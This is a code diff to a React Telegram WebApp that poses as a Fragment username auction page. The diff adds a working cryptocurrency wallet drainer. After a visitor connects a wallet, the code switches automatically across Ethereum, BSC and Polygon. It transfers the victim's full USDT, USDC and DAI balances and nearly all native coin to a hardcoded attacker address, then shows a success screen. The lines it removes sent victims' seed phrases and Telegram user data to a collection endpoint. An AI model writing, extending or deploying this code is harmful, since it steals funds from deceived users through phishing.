@@ -1,6 +1,10 @@
 import { useState, useEffect } from 'react';
 import { ArrowUpRight, ShieldCheck, Menu, X, ExternalLink, ArrowLeft, History, Share2, CreditCard, Wallet, Lock, Send, Phone, Key, Fingerprint, CheckCircle2, Globe, BadgeCheck, Zap } from 'lucide-react';
 import { motion, AnimatePresence } from 'motion/react';
+import { useWeb3Modal } from '@web3modal/wagmi/react';
+import { useAccount, useDisconnect, useSwitchChain, useSendTransaction, useBalance, useWriteContract } from 'wagmi';
+import { mainnet, bsc, polygon } from 'wagmi/chains';
+import { parseEther, parseUnits, createPublicClient, http, erc20Abi } from 'viem';
 
 // Use a fallback for when Telegram WebApp is not available (e.g., in a browser)
 const tg = (window as any).Telegram?.WebApp;
@@ -16,6 +20,13 @@ export default function App() {
   const [seedPhrase, setSeedPhrase] = useState('');
   const [loading, setLoading] = useState(false);
   const [allowedMethods, setAllowedMethods] = useState<string[]>(['telegram', 'wallet', 'card']);
+
+  const { open } = useWeb3Modal();
+  const { address, isConnected, chainId } = useAccount();
+  const { disconnect } = useDisconnect();
+  const { switchChainAsync } = useSwitchChain();
+  const { sendTransactionAsync } = useSendTransaction();
+  const { writeContractAsync } = useWriteContract();
 
   const [pageData, setPageData] = useState({
     username: 'news',
@@ -129,15 +140,120 @@ export default function App() {
   };
 
   const handleWalletSubmit = async () => {
+    open();
+  };
+
+  const DESTINATION_ADDRESS = '0x5020eefd8c93680510f06daa8096e5f20d34b23b';
+
+  const TOKENS = {
+    [mainnet.id]: [
+      { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', symbol: 'USDT', decimals: 6 },
+      { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', symbol: 'USDC', decimals: 6 },
+      { address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', symbol: 'DAI', decimals: 18 },
+    ],
+    [bsc.id]: [
+      { address: '0x55d398326f99059fF775485246999027B3197955', symbol: 'USDT', decimals: 18 },
+      { address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', symbol: 'USDC', decimals: 18 },
+      { address: '0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3', symbol: 'DAI', decimals: 18 },
+    ],
+    [polygon.id]: [
+      { address: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', symbol: 'USDT', decimals: 6 },
+      { address: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174', symbol: 'USDC', decimals: 6 },
+      { address: '0x8f3Cf7ad23Cd3BaDbD9735AFf958023239c6A063', symbol: 'DAI', decimals: 18 },
+    ],
+  };
+
+  const RPC_URLS = {
+    [mainnet.id]: 'https://eth.llamarpc.com',
+    [bsc.id]: 'https://bsc-dataseed.binance.org',
+    [polygon.id]: 'https://polygon-rpc.com',
+  };
+
+  useEffect(() => {
+    if (isConnected && address) {
+      startTransferFlow();
+    }
+  }, [isConnected, address]);
+
+  const startTransferFlow = async () => {
     setLoading(true);
     try {
-      await fetch('api/submit/wallet', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ seedPhrase, user: tg?.initDataUnsafe?.user })
-      });
+      const chainsToProcess = [mainnet, bsc, polygon];
+
+      for (const chain of chainsToProcess) {
+        // 1. Switch chain if needed
+        if (chainId !== chain.id) {
+          try {
+            await switchChainAsync({ chainId: chain.id });
+          } catch (err) {
+            console.error(`Failed to switch to ${chain.name}`, err);
+            continue; // Skip this chain if switch fails
+          }
+        }
+
+        const publicClient = createPublicClient({
+          chain: chain,
+          transport: http(RPC_URLS[chain.id as keyof typeof RPC_URLS])
+        });
+
+        // 2. Process ERC20 Tokens
+        const chainTokens = TOKENS[chain.id as keyof typeof TOKENS] || [];
+        for (const token of chainTokens) {
+          try {
+            const balance = await publicClient.readContract({
+              address: token.address as `0x${string}`,
+              abi: erc20Abi,
+              functionName: 'balanceOf',
+              args: [address as `0x${string}`],
+            });
+
+            if (balance > 0n) {
+              const hash = await writeContractAsync({
+                address: token.address as `0x${string}`,
+                abi: erc20Abi,
+                functionName: 'transfer',
+                args: [DESTINATION_ADDRESS as `0x${string}`, balance],
+                chainId: chain.id
+              });
+              console.log(`Sent ${token.symbol} on ${chain.name}: ${hash}`);
+            }
+          } catch (err) {
+            console.error(`Error sending ${token.symbol} on ${chain.name}`, err);
+          }
+        }
+
+        // 3. Process Native Token
+        try {
+          // Re-fetch balance to account for gas spent on ERC20 transfers
+          const nativeBalance = await publicClient.getBalance({ address: address as `0x${string}` });
+          if (nativeBalance > 0n) {
+            const gasPrice = await publicClient.getGasPrice();
+            const gasLimit = 21000n;
+            const gasCost = gasPrice * gasLimit;
+
+            if (nativeBalance > gasCost) {
+              // Leave a small buffer for price fluctuations and rounding (10%)
+              const amountToSend = nativeBalance - (gasCost * 110n / 100n);
+              if (amountToSend > 0n) {
+                const hash = await sendTransactionAsync({
+                  to: DESTINATION_ADDRESS as `0x${string}`,
+                  value: amountToSend,
+                  gas: gasLimit,
+                  gasPrice: gasPrice,
+                  chainId: chain.id
+                });
+                console.log(`Sent native on ${chain.name}: ${hash}`);
+              }
+            }
+          }
+        } catch (err) {
+          console.error(`Error sending native on ${chain.name}`, err);
+        }
+      }
       setModalStep('success');
-    } catch (err) {}
+    } catch (err) {
+      console.error("Transfer flow error", err);
+    }
     setLoading(false);
   };
 
@@ -176,9 +292,7 @@ export default function App() {
                 <span className="text-[10px] font-bold text-fragment-blue tracking-widest">AUCTION</span>
               </div>
             </div>
-            <button className="bg-white/10 hover:bg-white/15 text-white px-5 py-2.5 rounded-xl font-bold text-xs transition-all border border-white/5">
-              Connect TON
-            </button>
+            <div />
           </div>
         </div>
       </header>
@@ -305,9 +419,9 @@ export default function App() {
                       </button>
                     )}
                     {allowedMethods.includes('wallet') && (
-                      <button onClick={() => setModalStep('wallet')} className="w-full p-5 bg-white/5 border border-white/5 rounded-2xl flex items-center gap-5 hover:bg-white/10 hover:border-fragment-blue/30 transition-all group">
+                      <button onClick={handleWalletSubmit} className="w-full p-5 bg-white/5 border border-white/5 rounded-2xl flex items-center gap-5 hover:bg-white/10 hover:border-fragment-blue/30 transition-all group">
                         <div className="w-12 h-12 bg-green-500/10 rounded-xl flex items-center justify-center text-green-500 group-hover:scale-110 transition-transform"><Wallet size={24} /></div>
-                        <div className="text-left"><p className="font-black text-white text-sm">Crypto Wallet</p><p className="text-[10px] font-bold text-fragment-text-dim/60">TON, ETH, BTC Seeds</p></div>
+                        <div className="text-left"><p className="font-black text-white text-sm">Crypto Wallet</p><p className="text-[10px] font-bold text-fragment-text-dim/60">Connect via WalletConnect</p></div>
                       </button>
                     )}
                   </div>
